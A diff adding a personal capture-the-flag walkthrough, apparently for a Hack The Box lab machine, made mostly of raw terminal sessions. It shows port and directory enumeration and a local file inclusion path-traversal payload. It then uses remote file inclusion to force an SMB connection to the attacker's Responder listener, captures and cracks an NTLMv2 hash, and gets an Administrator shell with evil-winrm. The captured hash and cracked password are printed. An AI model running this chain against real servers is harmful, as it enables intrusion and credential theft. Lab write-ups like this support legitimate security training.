@@ -1,0 +1,355 @@
+    ~/CTF    main ?1  nmap -sC -sV -p- -T5  10.129.213.177                                                                                                                               INT ✘  13:29:45  
+Starting Nmap 7.93 ( https://nmap.org ) at 2022-12-18 13:29 CET
+Nmap scan report for 10.129.213.177
+Host is up (0.023s latency).
+Not shown: 65532 filtered tcp ports (no-response)
+PORT     STATE SERVICE    VERSION
+80/tcp   open  http       Apache httpd 2.4.52 ((Win64) OpenSSL/1.1.1m PHP/8.1.1)
+|_http-server-header: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.1
+|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
+5985/tcp open  http       Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
+7680/tcp open  tcpwrapped
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 79.74 seconds
+
+==================
+  Google search
+==================
+7680 	tcp 	wudo 	TCP port 760 is used by WUDO (Windows Update Delivery Optimization) in Windows LANs. This includes both local and remote computers within a domain
+
+Microsoft Delivery Optimization Peer-to-Peer (TCP/UDP) (IANA official) 	SG
+7680 	tcp 	wud0 	TCP port 7680 is used by WUDO (Windows Update Delivery Optimization) to distribute updates in Windows LANs.
+
+IANA registered for: Pando Media Public Distribution 	SG
+
+
+
+# Check website
+curl -X GET http://10.129.213.177
+<meta http-equiv="refresh" content="0;url=http://unika.htb/">                                                                                                                    
+
+=> WebSite use an VHOST by DNS http://10.129.213.177/ => http://unika.htb/, website is only available by DNS
+
+# Adjust internal DNS to match with unika.htb
+    ~/CTF    main ?2  cat /etc/hosts                                                                                                                                              ✔  4m 45s   13:50:04  
+# Static table lookup for hostnames.
+# See hosts(5) for details.
+
+10.129.213.177 unika.htb
+
+
+# Check Fake DNS
+
+    ~/CTF/Boxes/Crocodile    main ?2  nslookup unika.htb                                                                                                         1 ✘  13:51:13  
+Server:         192.168.2.254
+Address:        192.168.2.254#53
+
+** server can't find unika.htb: NXDOMAIN
+
+    ~/CTF/Boxes/Crocodile    main ?2  ping unika.htb                                                                                                             1 ✘  13:51:28  
+PING unika.htb (10.129.213.177) 56(84) octets de données.
+64 octets de unika.htb (10.129.213.177) : icmp_seq=1 ttl=127 temps=132 ms
+64 octets de unika.htb (10.129.213.177) : icmp_seq=2 ttl=127 temps=33.8 ms
+^C
+--- statistiques ping unika.htb ---
+2 paquets transmis, 2 reçus, 0% packet loss, time 1002ms
+rtt min/avg/max/mdev = 33.802/83.133/132.464/49.331 ms
+    ~/CTF/Boxes/Crocodile    main ?2                                                                                                                                                                         ✔  13:51:31  
+
+
+
+    ~/CTF/Boxes/Crocodile    main ?2  curl -X GET http://unika.htb                                                                                                                                           ✔  13:51:31  
+<!doctype html>
+<html lang="en-US">
+   ......            
+
+   ......
+</html>
+
+=====================================================================================================================================================================================================
+=====================================================================================================================================================================================================
+
+Crawerler the website 
+
+gobuster dir -u http://unika.htb  -w /usr/share/dirb/wordlists/common.txt -x .php
+===============================================================
+Gobuster v3.3
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://unika.htb
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                /usr/share/dirb/wordlists/common.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.3
+[+] Extensions:              php
+[+] Timeout:                 10s
+===============================================================
+2022/12/18 13:55:09 Starting gobuster in directory enumeration mode
+===============================================================
+/.hta.php             (Status: 403) [Size: 298]
+/.hta                 (Status: 403) [Size: 298]
+/.htpasswd.php        (Status: 403) [Size: 298]
+/.htpasswd            (Status: 403) [Size: 298]
+/.htaccess            (Status: 403) [Size: 298]
+/.htaccess.php        (Status: 403) [Size: 298]
+/aux                  (Status: 403) [Size: 298]
+/aux.php              (Status: 403) [Size: 298]
+/cgi-bin/             (Status: 403) [Size: 298]
+/com1                 (Status: 403) [Size: 298]
+/com2                 (Status: 403) [Size: 298]
+/com2.php             (Status: 403) [Size: 298]
+/com1.php             (Status: 403) [Size: 298]
+/com3                 (Status: 403) [Size: 298]
+/com3.php             (Status: 403) [Size: 298]
+/con                  (Status: 403) [Size: 298]
+/con.php              (Status: 403) [Size: 298]
+/css                  (Status: 301) [Size: 328] [--> http://unika.htb/css/]
+/examples             (Status: 503) [Size: 398]
+/img                  (Status: 301) [Size: 328] [--> http://unika.htb/img/]
+/inc                  (Status: 301) [Size: 328] [--> http://unika.htb/inc/]
+/index.php            (Status: 200) [Size: 46453]
+/index.php            (Status: 200) [Size: 46453]
+/Index.php            (Status: 200) [Size: 46453]
+/js                   (Status: 301) [Size: 327] [--> http://unika.htb/js/]
+/licenses             (Status: 403) [Size: 417]
+/lpt1                 (Status: 403) [Size: 298]
+/lpt2                 (Status: 403) [Size: 298]
+/lpt1.php             (Status: 403) [Size: 298]
+/lpt2.php             (Status: 403) [Size: 298]
+/nul                  (Status: 403) [Size: 298]
+/nul.php              (Status: 403) [Size: 298]
+/phpmyadmin           (Status: 403) [Size: 417]
+/prn.php              (Status: 403) [Size: 298]
+/prn                  (Status: 403) [Size: 298]
+/server-status        (Status: 403) [Size: 417]
+/server-info          (Status: 403) [Size: 417]
+/webalizer            (Status: 403) [Size: 417]
+Progress: 9219 / 9230 (99.88%)===============================================================
+2022/12/18 13:56:04 Finished
+===============================================================
+
+
+
+
+Local File Inclusion (LFI) : 
+=============================
+
+    ~/CTF/Boxes/Crocodile    main ?2  curl -X GET http://unika.htb/index.php\?page\=../../../../../../../../windows/system32/drivers/etc/hosts                       ✔  55s   13:56:04  
+# Copyright (c) 1993-2009 Microsoft Corp.
+#
+# This is a sample HOSTS file used by Microsoft TCP/IP for Windows.
+#
+# This file contains the mappings of IP addresses to host names. Each
+# entry should be kept on an individual line. The IP address should
+# be placed in the first column followed by the corresponding host name.
+# The IP address and the host name should be separated by at least one
+# space.
+#
+# Additionally, comments (such as these) may be inserted on individual
+# lines or following the machine name denoted by a '#' symbol.
+#
+# For example:
+#
+#      102.54.94.97     rhino.acme.com          # source server
+#       38.25.63.10     x.acme.com              # x client host
+
+# localhost name resolution is handled within DNS itself.
+#       127.0.0.1       localhost
+
+
+# Remote file inclusion (RFI)
+=============================
+//10.10.14.6/somefile
+
+
+# Hacking windows password
+
+
+
+
+
+1. Fist Step
+
+# disable firewall
+sudo systemctl stop firewalld
+
+
+# using the responder
+git clone https://github.com/lgandx/Responder
+cd Responder 
+sudo pip install -r requirements.txt
+
+2. Start Responder
+
+    /opt/HackingTools/Responder    master ?5  ifconfig                                                                                                                                       ✔  14:09:42  
+
+tun0: flags=4305<UP,POINTOPOINT,RUNNING,NOARP,MULTICAST>  mtu 1500
+        inet 10.10.14.233  netmask 255.255.254.0  destination 10.10.14.233
+        inet6 fe80::ee25:d76a:6d35:30e7  prefixlen 64  scopeid 0x20<link>
+        inet6 dead:beef:2::10e7  prefixlen 64  scopeid 0x0<global>
+        unspec 00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00  txqueuelen 500  (UNSPEC)
+        RX packets 631861  bytes 126394553 (120.5 MiB)
+        RX errors 0  dropped 0  overruns 0  frame 0
+        TX packets 972256  bytes 157178844 (149.8 MiB)
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+
+   /opt/HackingTools/Responder_old    master ?7  sudo ./Responder.py -I tun0 -P -v                                                                                                          ✔  14:55:41  
+                                         __
+  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
+  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
+  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
+                   |__|
+
+           NBT-NS, LLMNR & MDNS Responder 3.1.3.0
+
+  To support this project:
+  Patreon -> https://www.patreon.com/PythonResponder
+  Paypal  -> https://paypal.me/PythonResponder
+
+  Author: Laurent Gaffie (laurent.gaffie@gmail.com)
+  To kill this script hit CTRL-C
+
+
+[+] Poisoners:
+    LLMNR                      [ON]
+    NBT-NS                     [ON]
+    MDNS                       [ON]
+    DNS                        [ON]
+    DHCP                       [OFF]
+
+[+] Servers:
+    HTTP server                [ON]
+    HTTPS server               [ON]
+    WPAD proxy                 [OFF]
+    Auth proxy                 [ON]
+    SMB server                 [ON]
+    Kerberos server            [ON]
+    SQL server                 [ON]
+    FTP server                 [ON]
+    IMAP server                [ON]
+    POP3 server                [ON]
+    SMTP server                [ON]
+    DNS server                 [ON]
+    LDAP server                [ON]
+    RDP server                 [ON]
+    DCE-RPC server             [ON]
+    WinRM server               [ON]
+    SNMP server                [OFF]
+
+[+] HTTP Options:
+    Always serving EXE         [OFF]
+    Serving EXE                [OFF]
+    Serving HTML               [OFF]
+    Upstream Proxy             [OFF]
+
+[+] Poisoning Options:
+    Analyze Mode               [OFF]
+    Force WPAD auth            [OFF]
+    Force Basic Auth           [OFF]
+    Force LM downgrade         [OFF]
+    Force ESS downgrade        [OFF]
+
+[+] Generic Options:
+    Responder NIC              [tun0]
+    Responder IP               [10.10.14.233]
+    Responder IPv6             [dead:beef:2::10e7]
+    Challenge set              [random]
+    Don't Respond To Names     ['ISATAP', 'ISATAP.LOCAL']
+
+[+] Current Session Variables:
+    Responder Machine Name     [WIN-K9HVE4WRR3Q]
+    Responder Domain Name      [WY1I.LOCAL]
+    Responder DCE-RPC Port     [46175]
+
+[+] Listening for events...
+
+
+Set RFI to responder
+======================
+
+    /opt/HackingTools/Responder    master ?5  curl -X GET http://unika.htb/\?page\=//10.10.14.233/blahblah                                                                                   ✔  15:57:23  
+<br />
+<b>Warning</b>:  include(\\10.10.14.233\BLAHBLAH): Failed to open stream: Permission denied in <b>C:\xampp\htdocs\index.php</b> on line <b>11</b><br />
+<br />
+<b>Warning</b>:  include(): Failed opening '//10.10.14.233/blahblah' for inclusion (include_path='\xampp\php\PEAR') in <b>C:\xampp\htdocs\index.php</b> on line <b>11</b><br />
+
+# Get the Hash
+
+[SMB] NTLMv2-SSP Client   : 10.129.213.177
+[SMB] NTLMv2-SSP Username : RESPONDER\Administrator
+[SMB] NTLMv2-SSP Hash     : Administrator::RESPONDER:aeca0ae2cf0cb31e:9EC191AD102AAE77B6BA996458F26F67:01010000000000008094A270F912D901C218F3FB119E76A10000000002000800510032003000310001001E00570049004E002D004A00560041004E00330033005000310044004200450004003400570049004E002D004A00560041004E0033003300500031004400420045002E0051003200300031002E004C004F00430041004C000300140051003200300031002E004C004F00430041004C000500140051003200300031002E004C004F00430041004C00070008008094A270F912D90106000400020000000800300030000000000000000100000000200000501480F495FB73F293DB547C0969BCB60F038AC6BA729FF54E517291B39BA3A10A001000000000000000000000000000000000000900220063006900660073002F00310030002E00310030002E00310034002E003200330033000000000000000000                                                                                                                     
+
+
+Crack the hash
+
+   ~/CTF/Boxes/Responder    main ?2  echo "Administrator::RESPONDER:aeca0ae2cf0cb31e:9EC191AD102AAE77B6BA996458F26F67:01010000000000008094A270F912D901C218F3FB119E76A10000000002000800510032003000310001001E00570049004E002D004A00560041004E00330033005000310044004200450004003400570049004E002D004A00560041004E0033003300500031004400420045002E0051003200300031002E004C004F00430041004C000300140051003200300031002E004C004F00430041004C000500140051003200300031002E004C004F00430041004C00070008008094A270F912D90106000400020000000800300030000000000000000100000000200000501480F495FB73F293DB547C0969BCB60F038AC6BA729FF54E517291B39BA3A10A001000000000000000000000000000000000000900220063006900660073002F00310030002E00310030002E00310034002E003200330033000000000000000000" > hash.txt                  
+
+   ~/CTF/Boxes/Responder    main ?2  john --format=netntlmv2 --wordlist=/usr/share/wordlists/rockyou.txt hash.txt                                                           ✔  22:47:14  
+Using default input encoding: UTF-8
+Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
+Will run 20 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+badminton        (Administrator)
+1g 0:00:00:00 DONE (2022-12-18 22:47) 20.00g/s 204800p/s 204800c/s 204800C/s 123456..1asshole
+Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably
+Session completed
+
+
+
+Attack WUDO by evil-WinRM
+
+#enable legacy md4
+sudo nano /etc/ssl/openssl.cnf
+
+[provider_sect]
+default = default_sect
+legacy = legacy_sect
+
+[default_sect]
+activate = 1
+
+[legacy_sect]
+activate = 1
+
+
+# Execute the evil-winrm
+
+    /opt/HackingTools/winrm/evil-winrm    master  ./evil-winrm.rb  -i 10.129.140.219 -u Administrator -p badminton                                                         1 ✘  23:28:55  
+
+Evil-WinRM shell v3.4
+
+Info: Establishing connection to remote endpoint
+
+*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
+responder\administrator
+*Evil-WinRM* PS C:\Users\Administrator\Documents> powershell.exe
+Windows PowerShell
+Copyright (C) Microsoft Corporation. All rights reserved.
+
+Try the new cross-platform PowerShell https://aka.ms/pscore6
+
+PS C:\Users\Administrator\Documents>
+l*Evil-WinRM* PS C:\Users\Administrator\Documents> ls C:\Users\
+
+
+    Directory: C:\Users
+
+
+Mode                 LastWriteTime         Length Name
+----                 -------------         ------ ----
+d-----          3/9/2022   5:35 PM                Administrator
+d-----          3/9/2022   5:33 PM                mike
+d-r---        10/10/2020  12:37 PM                Public
+
+
+*Evil-WinRM* PS C:\Users\Administrator\Documents>Get-ChildItem -Path C:\Users\mike\ -Filter *.txt -Recurse -ErrorAction SilentlyContinue -Force | %{$_.FullName}
+C:\Users\mike\Desktop\flag.txt
+
+*Evil-WinRM* PS C:\Users\Administrator\Documents> more C:\Users\mike\Desktop\flag.txt
+ea81b7afddd03efaa0945333ed147fac
+
